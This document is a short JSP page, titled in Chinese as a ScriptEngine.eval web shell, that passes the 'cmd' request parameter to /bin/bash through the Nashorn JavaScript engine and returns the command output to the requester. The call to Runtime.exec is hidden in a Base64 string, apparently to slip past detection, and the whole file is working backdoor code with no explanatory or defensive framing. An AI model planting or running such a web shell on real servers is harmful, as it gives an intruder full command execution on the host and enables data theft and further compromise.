<%@ page import="javax.script.ScriptEngineManager" %>
<%@ page import="java.util.Base64" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<html>
<body>
<h2>ScriptEngine.eval的JSP WebShell</h2>
<%
    String s1 = "s=[3];s[0]='/bin/bash';s[1]='-c';s[2]='";
    String s2 = request.getParameter("cmd");
    String s3 = new String(Base64.getDecoder().decode("JztqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhzKTs="));
    Process process = (Process) new ScriptEngineManager().getEngineByName("nashorn").eval(s1 + s2 + s3);
    InputStream inputStream = process.getInputStream();
    StringBuilder stringBuilder = new StringBuilder();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while((line = bufferedReader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
    }
    if (stringBuilder.length() > 0) {
        response.getOutputStream().write(stringBuilder.toString().getBytes());
    }
%>
</body>
</html>